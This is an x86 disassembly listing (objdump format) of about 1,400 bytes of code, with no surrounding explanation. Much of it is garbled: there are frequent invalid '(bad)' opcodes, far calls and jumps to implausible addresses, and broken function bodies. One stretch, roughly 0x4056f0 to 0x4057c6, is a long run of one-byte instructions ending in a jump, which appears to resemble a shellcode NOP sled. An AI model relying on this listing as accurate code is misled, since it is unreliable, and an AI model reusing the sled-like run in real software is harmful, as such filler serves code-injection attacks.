  40558b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40558e:	03 c8                	add    %eax,%ecx
  405590:	8b 46 04             	mov    0x4(%esi),%eax
  405593:	3b d7                	cmp    %edi,%edx
  405595:	89 4e 08             	mov    %ecx,0x8(%esi)
  405598:	76 03                	jbe    0x40559d
  40559a:	57                   	push   %edi
  40559b:	46                   	inc    %esi
  40559c:	08 8b 76 0c 9b f6    	or     %cl,-0x964f38a(%ebx)
  4055a2:	74 da                	je     0x40557e
  4055a4:	83 e8 96             	sub    $0xffffff96,%eax
  4055a7:	4d                   	dec    %ebp
  4055a8:	00 00                	add    %al,(%eax)
  4055aa:	8b 55 08             	mov    0x8(%ebp),%edx
  4055ad:	8d 4f 18             	lea    0x18(%edi),%ecx
  4055b0:	26 07                	es pop %es
  4055b2:	96                   	xchg   %eax,%esi
  4055b3:	00 00                	add    %al,(%eax)
  4055b5:	8c 89 4f 10 8b 71    	mov    %cs,0x718b104f(%ecx)
  4055bb:	e7 00                	out    %eax,$0x0
  4055bd:	ff                   	(bad)
  4055be:	ff                   	(bad)
  4055bf:	ff 5f 5e             	lcall  *0x5e(%edi)
  4055c2:	de c8                	fmulp  %st,%st(0)
  4055c4:	ff 5b 8b             	lcall  *-0x75(%ebx)
  4055c7:	8e 5d c3             	mov    -0x3d(%ebp),%ds
  4055ca:	90                   	nop
  4055cb:	90                   	nop
  4055cc:	90                   	nop
  4055cd:	1c 8a                	sbb    $0x8a,%al
  4055cf:	90                   	nop
  4055d0:	55                   	push   %ebp
  4055d1:	8b ec                	mov    %esp,%ebp
  4055d3:	8b 4d f9             	mov    -0x7(%ebp),%ecx
  4055d6:	8b 55 08             	mov    0x8(%ebp),%edx
  4055d9:	8d 45 10             	lea    0x10(%ebp),%eax
  4055dc:	50                   	push   %eax
  4055dd:	f3 52                	repz push %edx
  4055df:	e8 96 fb 36 ff       	call   0xff77517a
  4055e4:	5d                   	pop    %ebp
  4055e5:	c3                   	ret
  4055e6:	c7                   	(bad)
  4055e7:	90                   	nop
  4055e8:	90                   	nop
  4055e9:	90                   	nop
  4055ea:	90                   	nop
  4055eb:	90                   	nop
  4055ec:	90                   	nop
  4055ed:	90                   	nop
  4055ee:	90                   	nop
  4055ef:	90                   	nop
  4055f0:	55                   	push   %ebp
  4055f1:	8b 5b 8b             	mov    -0x75(%ebx),%ebx
  4055f4:	4d                   	dec    %ebp
  4055f5:	08 8b 45 0c 89 41    	or     %cl,0x41890c45(%ebx)
  4055fb:	55                   	push   %ebp
  4055fc:	5d                   	pop    %ebp
  4055fd:	c2 08 fd             	ret    $0xfd08
  405600:	55                   	push   %ebp
  405601:	8b 12                	mov    (%edx),%edx
  405603:	56                   	push   %esi
  405604:	79 75                	jns    0x40567b
  405606:	08 85 ad 74 30 8b    	or     %al,-0x74cf8b53(%ebp)
  40560c:	46                   	inc    %esi
  40560d:	14 85                	adc    $0x85,%al
  40560f:	c0 4d 07 8b          	rorb   $0x8b,0x7(%ebp)
  405613:	08 89 4e 14 eb 08    	or     %cl,0x8eb144e(%ecx)
  405619:	18 10                	sbb    %dl,(%eax)
  40561b:	56                   	push   %esi
  40561c:	e8 3f f4 c2 ff       	call   0x34a60
  405621:	8b 78 0c             	mov    0xc(%eax),%edi
  405624:	8b 4d 17             	mov    0x17(%ebp),%ecx
  405627:	89 50 04             	mov    %edx,0x4(%eax)
  40562a:	8b 55 14             	mov    0x14(%ebp),%edx
  40562d:	89 48 08             	mov    %ecx,0x8(%eax)
  405630:	98                   	cwtl
  405631:	50                   	push   %eax
  405632:	0c f3                	or     $0xf3,%al
  405634:	4e                   	dec    %esi
  405635:	10 89 08 89 46 10    	adc    %cl,0x10468908(%ecx)
  40563b:	42                   	inc    %edx
  40563c:	5d                   	pop    %ebp
  40563d:	c2 10 00             	ret    $0x10
  405640:	55                   	push   %ebp
  405641:	8b 58 8b             	mov    -0x75(%eax),%ebx
  405644:	97                   	xchg   %eax,%edi
  405645:	08 b8 56 57 85 36    	or     %bh,0x36855756(%eax)
  40564b:	5a                   	pop    %edx
  40564c:	5f                   	pop    %edi
  40564d:	8b 42 10             	mov    0x10(%edx),%eax
  405650:	8b 75 10             	mov    0x10(%ebp),%esi
  405653:	0a 7d 0c             	or     0xc(%ebp),%bh
  405656:	8d 4a 10             	lea    0x10(%edx),%ecx
  405659:	85 c0                	test   %eax,%eax
  40565b:	e7 20                	out    %eax,$0x20
  40565d:	39 ed                	cmp    %ebp,%ebp
  40565f:	9e                   	sahf
  405660:	ec                   	in     (%dx),%al
  405661:	13 30                	adc    (%eax),%esi
  405663:	70 08                	jo     0x40566d
  405665:	74 ee                	je     0x405655
  405667:	11 c8                	adc    %ecx,%eax
  405669:	8b 00                	mov    (%eax),%eax
  40566b:	85 c0                	test   %eax,%eax
  40566d:	75 b6                	jne    0x405625
  40566f:	eb 0c                	jmp    0x40567d
  405671:	8b 18                	mov    (%eax),%ebx
  405673:	89 f7                	mov    %esi,%edi
  405675:	ca 4a 14             	lret   $0x144a
  405678:	89 8a 23 42 14 8b    	mov    %ecx,-0x74ebbddd(%edx)
  40567e:	42                   	inc    %edx
  40567f:	38 8d 4a 3a 85 c0    	cmp    %cl,-0x3f7ac5b6(%ebp)
  405685:	b0 72                	mov    $0x72,%al
  405687:	4c                   	dec    %esp
  405688:	78 04                	js     0x40568e
  40568a:	2b 8e 39 70 08 74    	sub    0x74087039(%esi),%ecx
  405690:	0f 8b c8 8b 00 ba    	jnp    0xba40e25e
  405696:	c0 75 ee 5f          	shlb   $0x5f,-0x12(%ebp)
  40569a:	5e                   	pop    %esi
  40569b:	9a 5d c2 dd 00 8b 30 	lcall  $0x308b,$0xddc25d
  4056a2:	1c 31                	sbb    $0x31,%al
  4056a4:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  4056a7:	c7                   	(bad)
  4056a8:	08 89 7f ad 09 0b    	or     %cl,0xb09ad7f(%ecx)
  4056ae:	8b 5d c2             	mov    -0x3e(%ebp),%ebx
  4056b1:	0c 33                	or     $0x33,%al
  4056b3:	90                   	nop
  4056b4:	90                   	nop
  4056b5:	6c                   	insb   (%dx),%es:(%edi)
  4056b6:	90                   	nop
  4056b7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056b8:	a9 90 90 9c 9a       	test   $0x9a9c9090,%eax
  4056bd:	90                   	nop
  4056be:	90                   	nop
  4056bf:	90                   	nop
  4056c0:	55                   	push   %ebp
  4056c1:	8b ec                	mov    %esp,%ebp
  4056c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4056c6:	33 8b 75 10 57 8b    	xor    -0x74a8ef8b(%ebx),%ecx
  4056cc:	7d 2f                	jge    0x4056fd
  4056ce:	45                   	inc    %ebp
  4056cf:	c2 7f e8             	ret    $0xe87f
  4056d2:	65 ff                	gs (bad)
  4056d4:	ff 71 57             	push   0x57(%ecx)
  4056d7:	ff a8 83 9c 5b 5f    	ljmp   *0x5f5b9c83(%eax)
  4056dd:	f8                   	clc
  4056de:	5d                   	pop    %ebp
  4056df:	c2 0c 00             	ret    $0xc
  4056e2:	90                   	nop
  4056e3:	90                   	nop
  4056e4:	90                   	nop
  4056e5:	30 90 90 ef 90 90    	xor    %dl,-0x6f6f1070(%eax)
  4056eb:	a0 a8 90 90 90       	mov    0x909090a8,%al
  4056f0:	55                   	push   %ebp
  4056f1:	58                   	pop    %eax
  4056f2:	41                   	inc    %ecx
  4056f3:	37                   	aaa
  4056f4:	f9                   	stc
  4056f5:	fc                   	cld
  4056f6:	98                   	cwtl
  4056f7:	d6                   	salc
  4056f8:	41                   	inc    %ecx
  4056f9:	27                   	daa
  4056fa:	3f                   	aas
  4056fb:	4b                   	dec    %ebx
  4056fc:	4a                   	dec    %edx
  4056fd:	27                   	daa
  4056fe:	f9                   	stc
  4056ff:	9f                   	lahf
  405700:	99                   	cltd
  405701:	4a                   	dec    %edx
  405702:	49                   	dec    %ecx
  405703:	41                   	inc    %ecx
  405704:	f9                   	stc
  405705:	fc                   	cld
  405706:	41                   	inc    %ecx
  405707:	48                   	dec    %eax
  405708:	92                   	xchg   %eax,%edx
  405709:	42                   	inc    %edx
  40570a:	43                   	inc    %ebx
  40570b:	d6                   	salc
  40570c:	93                   	xchg   %eax,%ebx
  40570d:	92                   	xchg   %eax,%edx
  40570e:	fc                   	cld
  40570f:	49                   	dec    %ecx
  405710:	93                   	xchg   %eax,%ebx
  405711:	27                   	daa
  405712:	41                   	inc    %ecx
  405713:	49                   	dec    %ecx
  405714:	4a                   	dec    %edx
  405715:	9b                   	fwait
  405716:	f8                   	clc
  405717:	41                   	inc    %ecx
  405718:	9b                   	fwait
  405719:	9f                   	lahf
  40571a:	fc                   	cld
  40571b:	48                   	dec    %eax
  40571c:	27                   	daa
  40571d:	f5                   	cmc
  40571e:	f9                   	stc
  40571f:	90                   	nop
  405720:	9b                   	fwait
  405721:	d6                   	salc
  405722:	9b                   	fwait
  405723:	2f                   	das
  405724:	d6                   	salc
  405725:	9f                   	lahf
  405726:	92                   	xchg   %eax,%edx
  405727:	27                   	daa
  405728:	99                   	cltd
  405729:	f5                   	cmc
  40572a:	42                   	inc    %edx
  40572b:	4a                   	dec    %edx
  40572c:	37                   	aaa
  40572d:	f9                   	stc
  40572e:	f8                   	clc
  40572f:	93                   	xchg   %eax,%ebx
  405730:	3f                   	aas
  405731:	98                   	cwtl
  405732:	99                   	cltd
  405733:	43                   	inc    %ebx
  405734:	91                   	xchg   %eax,%ecx
  405735:	99                   	cltd
  405736:	9b                   	fwait
  405737:	4b                   	dec    %ebx
  405738:	f9                   	stc
  405739:	93                   	xchg   %eax,%ebx
  40573a:	49                   	dec    %ecx
  40573b:	4b                   	dec    %ebx
  40573c:	42                   	inc    %edx
  40573d:	9f                   	lahf
  40573e:	9f                   	lahf
  40573f:	42                   	inc    %edx
  405740:	91                   	xchg   %eax,%ecx
  405741:	9b                   	fwait
  405742:	92                   	xchg   %eax,%edx
  405743:	42                   	inc    %edx
  405744:	27                   	daa
  405745:	40                   	inc    %eax
  405746:	91                   	xchg   %eax,%ecx
  405747:	92                   	xchg   %eax,%edx
  405748:	93                   	xchg   %eax,%ebx
  405749:	27                   	daa
  40574a:	49                   	dec    %ecx
  40574b:	91                   	xchg   %eax,%ecx
  40574c:	4a                   	dec    %edx
  40574d:	99                   	cltd
  40574e:	48                   	dec    %eax
  40574f:	37                   	aaa
  405750:	48                   	dec    %eax
  405751:	98                   	cwtl
  405752:	fc                   	cld
  405753:	9b                   	fwait
  405754:	d6                   	salc
  405755:	d6                   	salc
  405756:	98                   	cwtl
  405757:	fd                   	std
  405758:	d6                   	salc
  405759:	27                   	daa
  40575a:	91                   	xchg   %eax,%ecx
  40575b:	9b                   	fwait
  40575c:	41                   	inc    %ecx
  40575d:	91                   	xchg   %eax,%ecx
  40575e:	41                   	inc    %ecx
  40575f:	93                   	xchg   %eax,%ebx
  405760:	fd                   	std
  405761:	f8                   	clc
  405762:	f8                   	clc
  405763:	2f                   	das
  405764:	9b                   	fwait
  405765:	90                   	nop
  405766:	43                   	inc    %ebx
  405767:	43                   	inc    %ebx
  405768:	fc                   	cld
  405769:	f8                   	clc
  40576a:	49                   	dec    %ecx
  40576b:	27                   	daa
  40576c:	f8                   	clc
  40576d:	99                   	cltd
  40576e:	98                   	cwtl
  40576f:	93                   	xchg   %eax,%ebx
  405770:	92                   	xchg   %eax,%edx
  405771:	d6                   	salc
  405772:	92                   	xchg   %eax,%edx
  405773:	3f                   	aas
  405774:	fc                   	cld
  405775:	fc                   	cld
  405776:	99                   	cltd
  405777:	43                   	inc    %ebx
  405778:	37                   	aaa
  405779:	43                   	inc    %ebx
  40577a:	2f                   	das
  40577b:	f9                   	stc
  40577c:	2f                   	das
  40577d:	d6                   	salc
  40577e:	9f                   	lahf
  40577f:	92                   	xchg   %eax,%edx
  405780:	f8                   	clc
  405781:	98                   	cwtl
  405782:	98                   	cwtl
  405783:	fc                   	cld
  405784:	91                   	xchg   %eax,%ecx
  405785:	43                   	inc    %ebx
  405786:	40                   	inc    %eax
  405787:	91                   	xchg   %eax,%ecx
  405788:	41                   	inc    %ecx
  405789:	90                   	nop
  40578a:	4a                   	dec    %edx
  40578b:	90                   	nop
  40578c:	9b                   	fwait
  40578d:	91                   	xchg   %eax,%ecx
  40578e:	43                   	inc    %ebx
  40578f:	49                   	dec    %ecx
  405790:	37                   	aaa
  405791:	41                   	inc    %ecx
  405792:	2f                   	das
  405793:	98                   	cwtl
  405794:	40                   	inc    %eax
  405795:	41                   	inc    %ecx
  405796:	42                   	inc    %edx
  405797:	fd                   	std
  405798:	27                   	daa
  405799:	99                   	cltd
  40579a:	98                   	cwtl
  40579b:	2f                   	das
  40579c:	fc                   	cld
  40579d:	92                   	xchg   %eax,%edx
  40579e:	42                   	inc    %edx
  40579f:	90                   	nop
  4057a0:	4b                   	dec    %ebx
  4057a1:	99                   	cltd
  4057a2:	90                   	nop
  4057a3:	fd                   	std
  4057a4:	4b                   	dec    %ebx
  4057a5:	d6                   	salc
  4057a6:	41                   	inc    %ecx
  4057a7:	98                   	cwtl
  4057a8:	42                   	inc    %edx
  4057a9:	37                   	aaa
  4057aa:	48                   	dec    %eax
  4057ab:	9f                   	lahf
  4057ac:	99                   	cltd
  4057ad:	2f                   	das
  4057ae:	41                   	inc    %ecx
  4057af:	91                   	xchg   %eax,%ecx
  4057b0:	4a                   	dec    %edx
  4057b1:	90                   	nop
  4057b2:	f8                   	clc
  4057b3:	48                   	dec    %eax
  4057b4:	4b                   	dec    %ebx
  4057b5:	d6                   	salc
  4057b6:	42                   	inc    %edx
  4057b7:	9f                   	lahf
  4057b8:	93                   	xchg   %eax,%ebx
  4057b9:	37                   	aaa
  4057ba:	42                   	inc    %edx
  4057bb:	f8                   	clc
  4057bc:	42                   	inc    %edx
  4057bd:	27                   	daa
  4057be:	40                   	inc    %eax
  4057bf:	fc                   	cld
  4057c0:	3f                   	aas
  4057c1:	41                   	inc    %ecx
  4057c2:	41                   	inc    %ecx
  4057c3:	41                   	inc    %ecx
  4057c4:	3f                   	aas
  4057c5:	48                   	dec    %eax
  4057c6:	99                   	cltd
  4057c7:	e9 d2 07 00 00       	jmp    0x405f9e
  4057cc:	d1 00                	roll   $1,(%eax)
  4057ce:	8b 76 08             	mov    0x8(%esi),%esi
  4057d1:	6a f6                	push   $0xfffffff6
  4057d3:	75 d0                	jne    0x4057a5
  4057d5:	85 ff                	test   %edi,%edi
  4057d7:	74 2a                	je     0x405803
  4057d9:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4057dc:	85 f6                	test   %esi,%esi
  4057de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4057df:	23 7c 08 03          	and    0x3(%eax,%ecx,1),%edi
  4057e3:	fb                   	sti
  4057e4:	c0 c6 2d             	rol    $0x2d,%dh
  4057e7:	9a 73 19 56 62 e8 6f 	lcall  $0x6fe8,$0x62561973
  4057ee:	15 00 63 fc 00       	adc    $0xfc6300,%eax
  4057f3:	6a 02                	push   $0x2
  4057f5:	56                   	push   %esi
  4057f6:	53                   	push   %ebx
  4057f7:	e8 b7 6e 00 00       	call   0x40c6b3
  4057fc:	8b d8                	mov    %eax,%ebx
  4057fe:	5f                   	pop    %edi
  4057ff:	55                   	push   %ebp
  405800:	fc                   	cld
  405801:	eb 9d                	jmp    0x4057a0
  405803:	8b fd                	mov    %ebp,%edi
  405805:	08 8b 2c 83 7e 04    	or     %cl,0x47e832c(%ebx)
  40580b:	02 8f 0a 8b 06 6a    	add    0x6a068b0a(%edi),%cl
  405811:	60                   	pusha
  405812:	50                   	push   %eax
  405813:	25 b8 4b 00 00       	and    $0x4bb8,%eax
  405818:	8b 76 08             	mov    0x8(%esi),%esi
  40581b:	85 53 75             	test   %edx,0x75(%ebx)
  40581e:	e9 50 f3 8b 46       	jmp    0x46cc4b73
  405823:	6b 85 c0 74 71 8b 0e 	imul   $0xe,-0x748e8b40(%ebp),%eax
  40582a:	6a 84                	push   $0xffffff84
  40582c:	6a 00                	push   $0x0
  40582e:	6a 00                	push   $0x0
  405830:	51                   	push   %ecx
  405831:	e8 82 21 9d 00       	call   0xdd79b8
  405836:	8b 76 d4             	mov    -0x2c(%esi),%esi
  405839:	eb f1                	jmp    0x40582c
  40583b:	75 e4                	jne    0x405821
  40583d:	5e                   	pop    %esi
  40583e:	5f                   	pop    %edi
  40583f:	5b                   	pop    %ebx
  405840:	8b e5                	mov    %ebp,%esp
  405842:	5d                   	pop    %ebp
  405843:	c3                   	ret
  405844:	90                   	nop
  405845:	0b 2e                	or     (%esi),%ebp
  405847:	90                   	nop
  405848:	90                   	nop
  405849:	90                   	nop
  40584a:	90                   	nop
  40584b:	90                   	nop
  40584c:	90                   	nop
  40584d:	3e 90                	ds nop
  40584f:	90                   	nop
  405850:	55                   	push   %ebp
  405851:	8b ec                	mov    %esp,%ebp
  405853:	56                   	push   %esi
  405854:	8b 75 0c             	mov    0xc(%ebp),%esi
  405857:	33 dc                	xor    %esp,%ebx
  405859:	85 f6                	test   %esi,%esi
  40585b:	74 2b                	je     0x405888
  40585d:	57                   	push   %edi
  40585e:	8b fe                	mov    %esi,%edi
  405860:	83 c9 1f             	or     $0x1f,%ecx
  405863:	f2 d5 8b             	repnz aad $0x8b
  405866:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405867:	08 f7                	or     %dh,%bh
  405869:	d1 49 8b             	rorl   $1,-0x75(%ecx)
  40586c:	76 47                	jbe    0x4058b5
  40586e:	57                   	push   %edi
  40586f:	50                   	push   %eax
  405870:	e8 64 f1 ff ff       	call   0x4049d9
  405875:	8b cf                	mov    %edi,%ecx
  405877:	8b f8                	mov    %eax,%edi
  405879:	8b d1                	mov    %ecx,%edx
  40587b:	c1 bf 02 f3 a5 8b e4 	sarl   $0xe4,-0x745a0cfe(%edi)
  405882:	83 e1 03             	and    $0x3,%ecx
  405885:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405887:	53                   	push   %ebx
  405888:	5e                   	pop    %esi
  405889:	5d                   	pop    %ebp
  40588a:	c2 08 00             	ret    $0x8
  40588d:	90                   	nop
  40588e:	c6 05 df 8b 31 83 ec 	movb   $0xec,0x83318bdf
  405895:	24 a3                	and    $0xa3,%al
  405897:	56                   	push   %esi
  405898:	57                   	push   %edi
  405899:	ce                   	into
  40589a:	7d 01                	jge    0x40589d
  40589c:	33 db                	xor    %ebx,%ebx
  40589e:	33 d2                	xor    %edx,%edx
  4058a0:	85 ff                	test   %edi,%edi
  4058a2:	74 1a                	je     0x4058be
  4058a4:	8d 75 0c             	lea    0xc(%ebp),%esi
  4058a7:	83 10 ff             	adcl   $0xffffffff,(%eax)
  4058aa:	33 c0                	xor    %eax,%eax
  4058ac:	f2 ae                	repnz scas %es:(%edi),%al
  4058ae:	f7 a7 49 83 fb 06    	mull   0x6fb8349(%edi)
  4058b4:	7d 77                	jge    0x40592d
  4058b6:	89 4c 9d dc          	mov    %ecx,-0x24(%ebp,%ebx,4)
  4058ba:	43                   	inc    %ebx
  4058bb:	6d                   	insl   (%dx),%es:(%edi)
  4058bc:	7e 04                	jle    0x4058c2
  4058be:	83 c1 04             	add    $0x4,%ecx
  4058c1:	c9                   	leave
  4058c2:	d1 85 ff 75 e0 8b    	roll   $1,-0x741f8a01(%ebp)
  4058c8:	45                   	inc    %ebp
  4058c9:	08 42 52             	or     %al,0x52(%edx)
  4058cc:	50                   	push   %eax
  4058cd:	dc 8e f1 83 ff 8b    	fmull  -0x74007c0f(%esi)
  4058d3:	75 0c                	jne    0x4058e1
  4058d5:	33 76 fd             	xor    -0x3(%esi),%esi
  4058d8:	f6 14 2d f4 8b 09 89 	notb   -0x76f6740c(,%ebp,1)
  4058df:	4d                   	dec    %ebp
  4058e0:	fc                   	cld
  4058e1:	74 4e                	je     0x405931
  4058e3:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4058e6:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4058e9:	eb 03                	jmp    0x4058ee
  4058eb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4058ee:	83 f9 60             	cmp    $0x60,%ecx
  4058f1:	7d 0a                	jge    0x4058fd
  4058f3:	8b 44 8d dc          	mov    -0x24(%ebp,%ecx,4),%eax
  4058f7:	ac                   	lods   %ds:(%esi),%al
  4058f8:	09 4d fc             	or     %ecx,-0x4(%ebp)
  4058fb:	fe 0e                	decb   (%esi)
  4058fd:	8b fe                	mov    %esi,%edi
  4058ff:	60                   	pusha
  405900:	c9                   	leave
  405901:	ff 33                	push   (%ebx)
  405903:	c0 f2 ae             	shl    $0xae,%dl
  405906:	f7 d1                	not    %ecx
  405908:	49                   	dec    %ecx
  405909:	8b c1                	mov    %ecx,%eax
  40590b:	8b c8                	mov    %eax,%ecx
  40590d:	8b 8f 8c e5 03 d0    	mov    -0x2ffc1a74(%edi),%ecx
  405913:	c1 e9 02             	shr    $0x2,%ecx
  405916:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405918:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40591b:	a3 90 6b e1 03       	mov    %eax,0x3e16b90
  405920:	83 c1 04             	add    $0x4,%ecx
  405923:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405925:	8b 30                	mov    (%eax),%esi
  405927:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40592a:	85 f6                	test   %esi,%esi
  40592c:	75 1a                	jne    0x405948
  40592e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405931:	5f                   	pop    %edi
  405932:	5e                   	pop    %esi
  405933:	c6                   	(bad)
  405934:	8a 00                	mov    (%eax),%al
  405936:	5b                   	pop    %ebx
  405937:	8b 39                	mov    (%ecx),%edi
  405939:	5d                   	pop    %ebp
  40593a:	c3                   	ret
  40593b:	90                   	nop
  40593c:	90                   	nop
  40593d:	51                   	push   %ecx
  40593e:	90                   	nop
  40593f:	90                   	nop
  405940:	55                   	push   %ebp
  405941:	8b ec                	mov    %esp,%ebp
  405943:	e2 ec                	loop   0x405931
  405945:	08 66 8b             	or     %ah,-0x75(%esi)
  405948:	0d c8 0f 40 00       	or     $0x400fc8,%eax
  40594d:	a1 8d 9a 40 65       	mov    0x65409a8d,%eax
  405952:	8a 15 ca f3 a9 00    	mov    0xa9f3ca,%dl
  405958:	53                   	push   %ebx
  405959:	7e 8b                	jle    0x4058e6
  40595b:	75 0c                	jne    0x405969
  40595d:	66 89 4d f3          	mov    %cx,-0xd(%ebp)
  405961:	8b 4d 91             	mov    -0x6f(%ebp),%ecx
  405964:	85 2f                	test   %ebp,(%edi)
  405966:	57                   	push   %edi
  405967:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40596a:	88 55 cb             	mov    %dl,-0x35(%ebp)
  40596d:	8d 0d f8 7f 56 7c    	lea    0x7c567ff8,%ecx
  405973:	04 85                	add    $0x85,%al
  405975:	c9                   	leave
  405976:	73 1f                	jae    0x405997
  405978:	8b 45 10             	mov    0x10(%ebp),%eax
  40597b:	8b 15 bc f3 40 00    	mov    0x40f3bc,%edx
  405981:	8b c8                	mov    %eax,%ecx
  405983:	5f                   	pop    %edi
  405984:	5e                   	pop    %esi
  405985:	5b                   	pop    %ebx
  405986:	89 50 8a             	mov    %edx,-0x76(%eax)
  405989:	15 a4 b5 95 32       	adc    $0x3295b5a4,%eax
  40598e:	88 51 04             	mov    %dl,0x4(%ecx)
  405991:	8b e5                	mov    %ebp,%esp
  405993:	5d                   	pop    %ebp
  405994:	c2 0c 00             	ret    $0xc
  405997:	85 f6                	test   %esi,%esi
  405999:	7f 10                	jg     0x4059ab
  40599b:	7c 08                	jl     0x4059a5
  40599d:	81 f9 42 03 00 00    	cmp    $0x342,%ecx
  4059a3:	73 23                	jae    0x4059c8
  4059a5:	8b 75 10             	mov    0x10(%ebp),%esi
  4059a8:	9c                   	pushf
  4059a9:	68 b4 f3 40 00       	push   $0x40f3b4
  4059ae:	6a 05                	push   $0x5
  4059b0:	56                   	push   %esi
  4059b1:	e8 ca 2c 00 17       	call   0x17408680
  4059b6:	ae                   	scas   %es:(%edi),%al
  4059b7:	c4 67 85             	les    -0x7b(%edi),%esp
  4059ba:	c0 8b c6 28 8d e5 00 	rorb   $0x0,-0x1a72d73a(%ebx)
  4059c1:	00 00                	add    %al,(%eax)
  4059c3:	a2 cd 00 dd 00       	mov    %al,0xdd00cd
  4059c8:	8b f9                	mov    %ecx,%edi
  4059ca:	8b c1                	mov    %ecx,%eax
  4059cc:	b9 d6 b9 0a 00       	mov    $0xab9d6,%ecx
  4059d1:	00 6a 81             	add    %ch,-0x7f(%edx)
  4059d4:	e7 ff                	out    %eax,$0xff
  4059d6:	40                   	inc    %eax
  4059d7:	32 00                	xor    (%eax),%al
  4059d9:	e8 d3 5e 00 00       	call   0x40b8b1
  4059de:	8b f2                	mov    %edx,%esi
  4059e0:	8b 57 85             	mov    -0x7b(%edi),%edx
  4059e3:	f6 42 70 7f          	testb  $0x7f,0x70(%edx)
  4059e7:	08 81 f9 cd 03 00    	or     %al,0x3cdf9(%ecx)
  4059ed:	00 72 03             	add    %dh,0x3(%edx)
  4059f0:	43                   	inc    %ebx
  4059f1:	9e                   	sahf
  4059f2:	d5 02                	aad    $0x2
  4059f4:	65 7c 78             	gs jl  0x405a6f
  4059f7:	7f 94                	jg     0x40598d
  4059f9:	83 f9 09             	cmp    $0x9,%ecx
  4059fc:	4d                   	dec    %ebp
  4059fd:	58                   	pop    %eax
  4059fe:	00 e9                	add    %ch,%cl
  405a00:	09 75 4a             	or     %esi,0x4a(%ebp)
  405a03:	85 f6                	test   %esi,%esi
  405a05:	27                   	daa
  405a06:	08 81 ff cd 03 00    	or     %al,0x3cdff(%ecx)
  405a0c:	00 7c 47 c3          	add    %bh,-0x3d(%edi,%eax,2)
  405a10:	ff 00                	incl   (%eax)
  405a12:	02 67 00             	add    0x0(%edi),%ah
  405a15:	7c a4                	jl     0x4059bb
  405a17:	83 c1 01             	add    $0x1,%ecx
  405a1a:	83 d7 00             	adc    $0x0,%edi
  405a1d:	0f be 03             	movsbl (%ebx),%eax
  405a20:	6a cb                	push   $0xffffffcb
  405a22:	10 50 79             	adc    %dl,0x79(%eax)
  405a25:	68 ac f3 40 00       	push   $0x40f3ac
  405a2a:	6a 05                	push   $0x5
  405a2c:	13 80 4e 2c 00 4b    	adc    0x4b002c4e(%eax),%eax
  405a32:	83 c4 14             	add    $0x14,%esp
  405a35:	79 c0                	jns    0x4059f7
  405a37:	7d 6d                	jge    0x405aa6
  405a39:	8b 15 a4 f3 ba 3c    	mov    0x3cbaf3a4,%edx
  405a3f:	8b 84 5f 77 11 a0 a8 	mov    -0x575fee89(%edi,%ebx,2),%eax
  405a46:	f3 40                	repz inc %eax
  405a48:	00 88 41 04 8b c6    	add    %cl,-0x3974fbbf(%eax)
  405a4e:	5e                   	pop    %esi
  405a4f:	5b                   	pop    %ebx
  405a50:	03 e5                	add    %ebp,%esp
  405a52:	5d                   	pop    %ebp
  405a53:	c2 0c 00             	ret    $0xc
  405a56:	8d 84 90 00 01 7c 00 	lea    0x7c0100(%eax,%edx,4),%eax
  405a5d:	99                   	cltd
  405a5e:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  405a64:	03 c2                	add    %edx,%eax
  405a66:	c1 f8 24             	sar    $0x24,%eax
  405a69:	83 f8 0a             	cmp    $0xa,%eax
  405a6c:	7c ff                	jl     0x405a6d
  405a6e:	83 c1 01             	add    $0x1,%ecx
  405a71:	83 d6 18             	adc    $0x18,%esi
  405a74:	33 c0                	xor    %eax,%eax
  405a76:	0f be 13             	movsbl (%ebx),%edx
  405a79:	8b 9d 10 52 50 51    	mov    0x51505210(%ebp),%ebx
  405a7f:	68 9c f3 40 00       	push   $0x40f39c
  405a84:	6a 05                	push   $0x5
  405a86:	56                   	push   %esi
  405a87:	4f                   	dec    %edi
  405a88:	f4                   	hlt
  405a89:	2b ca                	sub    %edx,%ecx
  405a8b:	d3 83 c4 21 85 c0    	roll   %cl,-0x3f7ade3c(%ebx)
  405a91:	7d 45                	jge    0x405ad8
  405a93:	8b c6                	mov    %esi,%eax
  405a95:	8b 6c 18 f3          	mov    -0xd(%eax,%ebx,1),%ebp
  405a99:	40                   	inc    %eax
  405a9a:	2f                   	das
  405a9b:	89 08                	mov    %ecx,(%eax)
  405a9d:	8a 15 a8 f3 40 00    	mov    0x40f3a8,%dl
  405aa3:	88 50 0a             	mov    %dl,0xa(%eax)
  405aa6:	8b c6                	mov    %esi,%eax
  405aa8:	5f                   	pop    %edi
  405aa9:	5e                   	pop    %esi
  405aaa:	5b                   	pop    %ebx
  405aab:	8b e5                	mov    %ebp,%esp
  405aad:	5d                   	pop    %ebp
  405aae:	c2 0c 00             	ret    $0xc
  405ab1:	90                   	nop
  405ab2:	90                   	nop
  405ab3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405ab4:	06                   	push   %es
  405ab5:	90                   	nop
  405ab6:	90                   	nop
  405ab7:	90                   	nop
  405ab8:	90                   	nop
  405ab9:	90                   	nop
  405aba:	90                   	nop
  405abb:	90                   	nop
  405abc:	18 90 90 90 55 8b    	sbb    %dl,-0x74aa6f70(%eax)
  405ac2:	ec                   	in     (%dx),%al
  405ac3:	53                   	push   %ebx
  405ac4:	56                   	push   %esi
  405ac5:	8b 75 0c             	mov    0xc(%ebp),%esi
  405ac8:	57                   	push   %edi
  405ac9:	6a 30                	push   $0x30
  405acb:	56                   	push   %esi
  405acc:	e8 8f ef 8e ff       	call   0xffcf4a60
  405ad1:	8b ca                	mov    %edx,%ecx
  405ad3:	08 22                	or     %ah,(%edx)
  405ad5:	15 80 58 40 00       	adc    $0x405880,%eax
